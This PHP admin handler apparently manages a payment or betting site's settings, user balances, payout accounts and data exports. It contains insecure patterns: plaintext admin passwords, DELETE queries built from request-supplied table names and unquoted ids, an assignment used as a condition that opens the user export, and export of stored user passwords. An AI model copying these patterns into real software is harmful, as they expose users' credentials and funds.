<?php
include '../inc/config.php';
include '../inc/functions.php';
$q = $_GET['q'];
if ($q == 'login') {
  $login = escape('login');
  $password = escape('password');
  if ($login == $main['admin_login'] && $password == $main['admin_password']) {
    $_SESSION['admin_login'] = $login;
    $_SESSION['admin_password'] = $password;
    die('success');
  }else{
    die('error');
  }
}elseif($q == 'logout'){
  unset($_SESSION['admin_login']);
  unset($_SESSION['admin_password']);
}
if ($admin == true) {
  if ($q == 'general') {
    $title = escape('title');
    $description = escape('description');
    $keywords = escape('keywords');
    $tv_url = escape('tv_url');
    $payment_api = escape('payment_api');
    $popup_url = escape('popup_url');
    $popup_status = escape('popup_status');
    $phone_status = escape('phone_status');
    $passport_status = escape('passport_status');
    $location = escape('location');
    $admin_login = escape('admin_login');
    $admin_password = escape('admin_password');
    $sources = $db->real_escape_string($_POST['sources']);
    if (empty($admin_login)) {
      $admin_login = $main['admin_login'];
    }elseif(empty($admin_password)){
      $admin_password = $main['admin_password'];
    }
    $db -> query("UPDATE main set
      title = '$title',
      description = '$description',
      keywords = '$keywords',
      phone_status = '$phone_status',
      passport_status = '$passport_status',
      popup_status = '$popup_status',
      popup_url = '$popup_url',
      location = '$location',
      tv_url = '$tv_url',
      admin_login = '$admin_login',
      admin_password = '$admin_password',
      sources = '$sources' where id=1");
      die('success');
    }elseif($q == 'accounts'){
      $papara_holder = escape('papara_holder');
      $papara_number = escape('papara_number');
      $bitcoin_wallet = escape('bitcoin_wallet');
      $bitcoin_img = escape('bitcoin_img');
      $cmt_holder = escape('cmt_holder');
      $cmt_number = escape('cmt_number');
      $payfix_holder = escape('payfix_holder');
      $payfix_number = escape('payfix_number');
      $db -> query("UPDATE accounts set
        papara_holder = '$papara_holder',
        papara_number = '$papara_number',
        bitcoin_wallet = '$bitcoin_wallet',
        bitcoin_img = '$bitcoin_img',
        cmt_holder = '$cmt_holder',
        cmt_number = '$cmt_number',
        payfix_holder = '$payfix_holder',
        payfix_number = '$payfix_number'
      where id = 1");
      die("success");
    }elseif($q == 'delete'){
      $table = escape_get('table');
      $id = escape_get('id');
      if (!empty($table) or !empty($id)) {
        $db->query("DELETE from $table where id=$id");
        die('success');
      }
    }elseif($q == 'delete_all'){
      $table = escape_get('table');
      $type = escape_get('type');
      if (!empty($table)) {
        $db->query("DELETE from $table".(isset($_GET['type']) ? " where type='$type'" : ''));
        die('success');
      }
    }elseif($q == 'change-balance'){
      $balance = escape('balance');
      $id = escape('id');
      if (!empty($balance) || intval($balance) > 0 && !empty($id)) {
        $db -> query("UPDATE users set balance = balance + '$balance' where (id='".intval($id)."' or login ='$id')");
        die('success');
      }else{
        die('error');
      }
    }elseif($q == 'change-status'){
      $id = intval($_POST['id']);
      $value = intval($_POST['value']);
      $user_id = intval($_POST['user_id']);
      $amount = intval($_POST['amount']);
      if (isset($id) && isset($value)) {
        echo 'success';
        $db -> query("UPDATE payments set status = '$value' where id = '$id'");
        if ($value == 1) {
          $db -> query("UPDATE users set balance = balance + '$amount 'where id='$user_id'");
        }
      }
    }elseif($q == 'show-details'){
      $id = escape('id');
      $res = $db -> query("SELECT * from payments where id='$id'")->fetch_assoc();
      echo json_encode($res, JSON_UNESCAPED_UNICODE);
    }elseif($q == 'update_limits'){
      foreach ($_POST['id'] as $key => $value) {
        $id = intval($_POST['id'][$key]);
        $min = $db -> real_escape_string(htmlspecialchars($_POST['minimum'][$key]));
        $max = $db -> real_escape_string(htmlspecialchars($_POST['maximum'][$key]));
        $db->query("UPDATE limits set min='$min',max='$max' where id='$id'");
      }
      die('success');
    }elseif($q == 'add-bank'){
      $name = escape('name');
      $account_holder = escape('account-holder');
      $account_number = escape('account-number');
      $branch_code = escape('branch-code');
      $iban = escape('iban');
      $db -> query("INSERT into banks set
        name = '$name',
        account_holder = '$account_holder',
        account_number = '$account_number',
        branch_code = '$branch_code',
        iban = '$iban'");
      die('success');
    }elseif($q == 'check-users'){
      $password = escape('password');
      if ($password == $main['admin_users_password']) {
        $_SESSION['admin_users_password'] = $password;
        die('success');
      }
    }elseif($q == "change-payment-status"){
      $type = escape("type");
      $db -> query("UPDATE payment_methods set status = !status where slug = '$type'");
      die("success");
    }elseif($q == "switch-theme"){
      if ($_SESSION['theme'] == "dark") {
        $_SESSION['theme'] = "light";
      } else {
        $_SESSION['theme'] = "dark";
      }
    }elseif($q = 'export-table'){
      $table = escape_get('table');
      $type = escape_get('type');
      if ($table == 'users') {
        $result = $db->query("SELECT id,login,password,phone,passport,time FROM $table order by id DESC");
      }elseif($table == 'payments'){
        $result = $db->query("SELECT * FROM $table where type = '$type' order by id DESC");
      }
      $fp = fopen('php://output', 'w');
      if ($fp && $result) {
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="export.csv"');
        while ($row = $result->fetch_array(MYSQLI_NUM)) {
          fputcsv($fp, array_values($row));
        }
        die;
      }
    }
}
?>
